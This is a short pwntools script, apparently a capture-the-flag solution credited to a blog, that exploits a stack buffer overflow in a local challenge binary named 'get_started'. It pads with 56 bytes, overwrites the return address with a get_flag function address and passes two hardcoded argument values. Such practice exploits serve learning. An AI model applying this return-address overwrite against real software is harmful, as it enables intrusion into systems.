# http://nextline.tistory.com/100
from pwn import *

padding = "A" * 56
get_flag_add = p32(0x80489a0)
a1_pass = p32(814536271)
a2_pass = p32(425138641)

p = process('./get_started')

payload = padding + get_flag_add + p32(4) + a1_pass + a2_pass
p.sendline(payload)
print "[+] SEND"

print "[+] " + p.recv(1024)[26:]
